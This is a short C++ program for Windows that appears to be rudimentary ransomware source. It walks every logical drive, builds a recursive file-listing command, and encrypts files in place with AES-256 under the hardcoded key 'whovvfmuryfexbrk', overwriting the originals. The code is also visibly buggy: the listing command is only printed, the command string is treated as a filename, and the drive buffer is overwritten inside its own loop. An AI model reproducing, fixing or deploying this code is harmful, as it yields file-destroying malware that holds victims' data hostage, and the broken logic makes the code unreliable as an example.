#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <iostream>
#include <Windows.h>

#include "aes256.cpp"

#define BUFFER_SIZE 1024*1024

using namespace std;

int encrypt(char *ginput, char *gkey) {
    ByteArray key, enc;
    size_t file_len;
    FILE *input, *output;
    srand(time(0));
    size_t key_len = 0;
    char *goutput = (char*)"tmp";
    while(gkey[key_len])
        key.push_back(gkey[key_len++]);
    input = fopen(ginput, "rb");
    output = fopen(goutput, "wb");
    Aes256 aes(key);
    _fseeki64(input, 0, SEEK_END);
    file_len = ftell(input);
    _fseeki64(input, 0, SEEK_SET);
    enc.clear();
    aes.encrypt_start(file_len, enc);
    fwrite(enc.data(), enc.size(), 1, output);
    while (!feof(input)) {
        unsigned char buffer[BUFFER_SIZE];
        size_t buffer_len;
        buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
        if (buffer_len > 0) {
            enc.clear();
            aes.encrypt_continue(buffer, buffer_len, enc);
            fwrite(enc.data(), enc.size(), 1, output);
            }
        }
        enc.clear();
        aes.encrypt_end(enc);
        fwrite(enc.data(), enc.size(), 1, output);
        fclose(input);
        fclose(output);
        CopyFile(goutput, ginput, 0);
        return 0;
}

int main(int argc, char** argv) {
    char key[] = "whovvfmuryfexbrk";
    DWORD mydrives = 100;
    char lpBuffer[100];
    DWORD GLDS = GetLogicalDriveStrings(mydrives, (LPSTR) lpBuffer);

    for(int i = 0; i < 100; i++)
        if(lpBuffer[i] && (lpBuffer[i] >= 'A' && lpBuffer[i] <= 'Z')) {
            snprintf(lpBuffer, sizeof(lpBuffer), "%c", lpBuffer[i]);
            string buffAsStdStr = lpBuffer;
            string result = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> list";
            cout << result + '\n';
            char *file_to_enc = new char[result.length() + 1];
            strcpy(file_to_enc, result.c_str());
            encrypt(file_to_enc, key);
        }
}